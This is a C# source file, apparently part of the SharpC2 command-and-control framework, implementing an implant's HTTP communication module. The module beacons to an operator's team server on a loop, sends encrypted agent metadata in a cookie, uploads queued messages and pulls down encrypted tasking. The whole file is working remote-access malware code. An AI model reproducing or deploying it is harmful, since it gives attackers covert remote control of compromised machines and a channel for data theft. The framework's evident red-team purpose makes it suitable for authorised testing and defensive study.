using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class HttpCommModule : ICommModule
{
    string ConnectAddress;
    int ConnectPort;

    ModuleStatus ModuleStatus;
    AgentMetadata Metadata;

    ConfigController Config;
    CryptoController Crypto;

    Queue<AgentMessage> Inbound = new Queue<AgentMessage>();
    Queue<AgentMessage> Outbound = new Queue<AgentMessage>();

    public HttpCommModule(string connectAddress, int connectPort)
    {
        ConnectAddress = connectAddress;
        ConnectPort = connectPort;
    }

    public ModuleStatus GetStatus()
    {
        return ModuleStatus;
    }

    public void Init(ConfigController config, CryptoController crypto)
    {
        ModuleStatus = ModuleStatus.Starting;

        Config = config;
        Crypto = crypto;
    }

    public bool RecvData(out AgentMessage message)
    {
        if (Inbound.Count > 0)
        {
            message = Inbound.Dequeue();
            return true;
        }
        else
        {
            message = null;
            return false;
        }
    }

    public void SendData(AgentMessage message)
    {
        Outbound.Enqueue(message);
    }

    public void SetMetadata(AgentMetadata metadata)
    {
        Metadata = metadata;
    }

    public void Start()
    {
        ModuleStatus = ModuleStatus.Running;

        Task.Factory.StartNew(delegate ()
        {
            while (ModuleStatus == ModuleStatus.Running)
            {
                var interval = (int)Config.GetOption(ConfigSetting.SleepInterval) * 1000;
                var jitter = (int)Config.GetOption(ConfigSetting.SleepJitter);

                CheckIn();

                Thread.Sleep(interval);
            }
        });
    }

    public void Stop()
    {
        ModuleStatus = ModuleStatus.Stopped;
    }

    private void CheckIn()
    {
        var metadata = Crypto.Encrypt(Metadata);
        var client = GetWebClient();
        client.Headers[HttpRequestHeader.Cookie] = string.Format("{0}={1}", "Metadata", Convert.ToBase64String(metadata));

        AgentMessage message;
        Uri uri;
        byte[] outMessage;
        string dataToSend;

        if (Outbound.Count > 0)
        {
            message = Outbound.Dequeue();
            outMessage = Crypto.Encrypt(message);
            dataToSend = $"Message={Convert.ToBase64String(outMessage)}";
            uri = new Uri($"http://{ConnectAddress}:{ConnectPort}");
            client.UploadDataAsync(uri, Encoding.UTF8.GetBytes(dataToSend));
        }
        else
        {
            message = new AgentMessage
            {
                Metadata = Metadata,
                Data = new C2Data
                {
                    AgentID = Metadata.AgentID,
                    Module = "Core",
                    Command = "AgentCheckIn"
                }
            };
            outMessage = Crypto.Encrypt(message);
            dataToSend = $"Message={Convert.ToBase64String(outMessage)}";
            uri = new Uri($"http://{ConnectAddress}:{ConnectPort}?{dataToSend}");
            client.DownloadDataAsync(uri);
        }

        client.Dispose();
    }

    private WebClient GetWebClient()
    {
        var client = new WebClient();
        client.Headers.Clear();
        client.Headers.Add("X-Malware", "SharpC2");

        client.DownloadDataCompleted += DownloadDataCallback;
        client.UploadDataCompleted += UploadDataCallback;

        return client;
    }

    private void DownloadDataCallback(object sender, DownloadDataCompletedEventArgs e)
    {
        try { ProcessTeamServerResponse(e.Result); }
        catch { }
    }

    private void UploadDataCallback(object sender, UploadDataCompletedEventArgs e)
    {
        try { ProcessTeamServerResponse(e.Result); }
        catch { }
    }

    private void ProcessTeamServerResponse(byte[] result)
    {
        if (Crypto.VerifyHMAC(result))
        {
            var message = Crypto.Decrypt<AgentMessage>(result);

            if (message != null)
            {
                Inbound.Enqueue(message);
            }
        }
    }
}